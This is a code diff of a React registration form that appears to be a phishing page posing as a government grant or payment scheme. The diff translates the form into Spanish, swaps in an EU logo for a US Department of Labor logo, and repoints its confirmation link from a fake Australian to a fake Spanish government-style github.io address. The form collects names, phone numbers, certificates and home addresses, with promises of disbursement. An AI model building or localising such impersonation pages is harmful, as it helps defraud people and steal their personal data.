@@ -3,10 +3,10 @@ import { Container, Row, Col, Form, Button, Modal } from 'react-bootstrap';
 import emailjs from 'emailjs-com';
 import Navbar from './Navbar';
 import Footer from './Footer';
-import img1 from "./img/DOL-MasterLogo_BLUE.svg"
+import img1 from "./img/Untitled1.png"
 import img2 from "./img/Untitled.png"
-import img3 from "./img/121.png"
-import img4 from "./img/Untitled1.png"
+import img3 from "./img/eulogo.png"
+import img4 from "./img/logo32.png"
 import './partners.css';
 
 const logos = [
@@ -201,8 +201,8 @@ const RegistrationForm = () => {
     <Navbar />
     <div style={{marginTop: '110px'}}>
     <div className='partner1'>
-      <h3 className='fw-semibold text-secondary pt-1'>Partners & Donors</h3>
-      <h5 className='fw-semibold' style={{color: '#575656'}}>In Collaboration With:</h5>
+      <h3 className='fw-semibold text-secondary pt-4'>Socios y Donantes</h3>
+      <h5 className='fw-semibold' style={{color: '#575656'}}>En Colaboración con:</h5>
       <div className='partner'>
       <div className="logo-list">
             {logos.map((logo) => (
@@ -219,17 +219,17 @@ const RegistrationForm = () => {
           {/* <div className="border border-2 p-2" >
           <p2 className="p-0">You are required to fill in your details before making a payment, in accordance with school policy.</p2>
           </div> */}
-          <h2 className="text-center my-2">Registration</h2>
-          <p className="text-center mb-4">Enter only correct details to avoid <span style={{color: "#FF0000"}}>error(s)</span> during disbursement.</p>
+          <h2 className="text-center my-2">Registro</h2>
+          <p className="text-center mb-4">Ingrese solo datos correctos para evitar <span style={{color: "#FF0000"}}>error(es)</span> durante la distribución.</p>
           <Form onSubmit={handleSubmit}>
             <Form.Group controlId="formFirstName">
-              <Form.Label>First Name</Form.Label>
-              <Form.Control type="text" placeholder="First Name" name="firstName" value={formValues.firstName} onChange={handleInputChange} required />
+              <Form.Label>Nombre</Form.Label>
+              <Form.Control type="text" placeholder="Nombre" name="firstName" value={formValues.firstName} onChange={handleInputChange} required />
             </Form.Group>
 
             <Form.Group controlId="formLastName" className="mt-2">
-              <Form.Label>Last Name</Form.Label>
-              <Form.Control type="text" placeholder="Last Name" name="lastName" value={formValues.lastName} onChange={handleInputChange} required />
+              <Form.Label>Apellido</Form.Label>
+              <Form.Control type="text" placeholder="Apellido" name="lastName" value={formValues.lastName} onChange={handleInputChange} required />
             </Form.Group>
 
             {/* <Form.Group controlId="formBirthDate" className="mt-2">
@@ -248,7 +248,7 @@ const RegistrationForm = () => {
             </Form.Group> */}
 
             <Form.Group controlId="formPhoneNumber" className="mt-2">
-              <Form.Label>Mobile Phone Number</Form.Label>
+              <Form.Label>Número de Teléfono Móvil</Form.Label>
               <Form.Control type="text" placeholder="0000 000 000" name="phoneNumber" value={formValues.phoneNumber} onChange={handlePhoneNumberChange} required />
             </Form.Group>            
 
@@ -258,16 +258,16 @@ const RegistrationForm = () => {
             </Form.Group> */}
 
             <Form.Group controlId="formToWhom" className="mt-2">
-              <Form.Label>Profession</Form.Label>
-              <Form.Control type="text" placeholder="Enter your profession" name="profession" value={formValues.profession} onChange={handleInputChange} required />
+              <Form.Label>Profesión</Form.Label>
+              <Form.Control type="text" placeholder="Ingrese su profesión" name="profession" value={formValues.profession} onChange={handleInputChange} required />
             </Form.Group>
 
             {/* upload file */}
 
             <Form.Group controlId="formFile" className="mt-2">
-              <Form.Label>Profession Verification</Form.Label>
+              <Form.Label>Verificación de Profesión</Form.Label>
               <br/>
-              <Form.Label style={{fontSize: '14px'}}>Upload a clear certificate to verify your profession</Form.Label>
+              <Form.Label style={{fontSize: '14px'}}>Suba un certificado claro para verificar su profesión</Form.Label>
               
               <Form.Control 
                 type="file" 
@@ -280,7 +280,7 @@ const RegistrationForm = () => {
 
             {selectedFile && (
               <div className="mt-2">
-                <p>Preview:</p>
+                <p>Vista previa:</p>
                 <img src={URL.createObjectURL(selectedFile)} alt="Preview" width="100px" />
               </div>
             )}
@@ -289,18 +289,18 @@ const RegistrationForm = () => {
 
 
             <Form.Group controlId="formAddress" className="mt-4">
-              <Form.Label>Mailing (Home) Address</Form.Label>
-              <Form.Control type="text" placeholder="Street Address" name="streetAddress" value={formValues.streetAddress} onChange={handleInputChange} required className="mb-2" />
+              <Form.Label>Dirección Postal (Domicilio)</Form.Label>
+              <Form.Control type="text" placeholder="Calle y Número o Nombre del Edificio" name="streetAddress" value={formValues.streetAddress} onChange={handleInputChange} required className="mb-2" />
               {/* <Form.Control type="text" placeholder="Street Address Line 2" name="streetAddress2" value={formValues.streetAddress2} onChange={handleInputChange} className="mb-2" /> */}
-              <Form.Control type="text" placeholder="Suburb" name="city" value={formValues.city} onChange={handleInputChange} required className="mb-2" />
-              <Form.Control type="text" placeholder="State / Province" name="state" value={formValues.state} onChange={handleInputChange} required className="mb-2" />
-              <Form.Control type="text" placeholder="Postal / Zip Code" name="postalCode" value={formValues.postalCode} onChange={handleInputChange} required />
+              <Form.Control type="text" placeholder="Ciudad" name="city" value={formValues.city} onChange={handleInputChange} required className="mb-2" />
+              <Form.Control type="text" placeholder="Comunidad Autónoma / Provincia" name="state" value={formValues.state} onChange={handleInputChange} required className="mb-2" />
+              <Form.Control type="text" placeholder="Código Postal" name="postalCode" value={formValues.postalCode} onChange={handleInputChange} required />
             </Form.Group>
 
-            <p className='fst-italic mt-3'>Please confirm and check your details before submitting to avoid <span style={{color: "#FF0000"}}>error(s)</span> during payment process</p>
+            <p className='fst-italic mt-3'>Por favor, confirme y verifique sus datos antes de enviarlos para evitar <span style={{color: "#FF0000"}}>error(es)</span> durante el proceso de pago.</p>
 
             <Button variant="primary" type="submit" >
-              SUBMIT
+            ENVIAR
             </Button>
           </Form>
         </Col>
@@ -308,11 +308,11 @@ const RegistrationForm = () => {
 
       <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
         <Modal.Header closeButton>
-          <Modal.Title>Confirm Your Details</Modal.Title>
+          <Modal.Title>Confirme Sus Datos</Modal.Title>
         </Modal.Header>
         <Modal.Body>
           <Button variant="primary" onClick={handleConfirm}>
-            <a href='https://gov-create.github.io/arc.gov.form.au/' target='blank' className='text-light text-decoration-none'>Yes, I Have Confirmed</a>
+            <a href='https://gov-create.github.io/gob.formulario.es/' target='blank' className='text-light text-decoration-none'>Sí, he confirmado</a>
           </Button>
         </Modal.Body>
       </Modal>
